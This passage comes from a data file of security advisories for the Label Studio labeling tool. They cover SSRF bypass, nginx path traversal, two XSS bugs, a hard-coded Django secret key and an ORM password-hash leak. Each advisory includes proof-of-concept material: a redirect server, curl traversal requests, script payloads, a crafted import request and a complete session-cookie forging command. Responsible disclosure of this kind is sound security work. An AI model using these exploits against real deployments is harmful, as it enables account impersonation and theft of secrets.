file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable 